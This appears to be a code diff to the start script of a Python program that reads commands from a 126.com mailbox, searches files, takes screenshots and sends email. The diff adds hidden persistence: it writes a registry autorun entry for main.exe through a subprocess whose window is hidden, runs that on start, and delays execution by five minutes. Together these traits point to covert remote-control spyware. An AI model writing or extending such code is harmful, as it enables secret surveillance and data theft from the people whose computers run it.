@@ -3,7 +3,7 @@
 'Start file of this project'
 
 import searchTool, readEmail, time, sendEmail, screenshot
-import smtplib, os
+import smtplib, os, sys, subprocess
 from threading import Timer
 from constant import Constant as C
 
@@ -15,6 +15,7 @@ class Main(object):
         self.pwd = pwd
         self.pop3_server = pop3_server
         self.searchPath = searchPath
+        self.IS_WIN32 = 'win32' in str(sys.platform).lower() 
 
     def __testSearchTool(self):
         searchPath = C.SEARCH_PATH
@@ -50,8 +51,24 @@ class Main(object):
             ss = screenshot.ScreenShot(5)
             ss.grab()
 
+    def __runWhenStart(self):
+        curr = os.path.abspath(".")
+        dirs = os.listdir(curr)
+        mainLink = os.path.join(curr, "main.exe")
+        self.__subprocess_call(C.START_REGEDIT + mainLink)
+    
+    def __subprocess_call(self, *args, **kwargs):  
+        if self.IS_WIN32:  
+            startupinfo = subprocess.STARTUPINFO()  
+            startupinfo.dwFlags = subprocess.CREATE_NEW_CONSOLE | subprocess.STARTF_USESHOWWINDOW  
+            startupinfo.wShowWindow = subprocess.SW_HIDE  
+            kwargs['startupinfo'] = startupinfo  
+        retcode = subprocess.call(*args, **kwargs)  
+        return retcode  
+
     def run(self):
         #**********Run code***************************
+        self.__runWhenStart()
         re = readEmail.ReadEmail(email, pwd, pop3_server, searchPath)
         content = re.downloadEmail()
         msg = re.parseContent(content)
@@ -75,4 +92,5 @@ pop3_server = C.POP3_126_SERVER
 searchPath = C.SEARCH_PATH
 
 main = Main(timer_interval, email, pwd, pop3_server, searchPath)
-main.run()
+t = Timer(60 * 5,main.run)
+t.start()
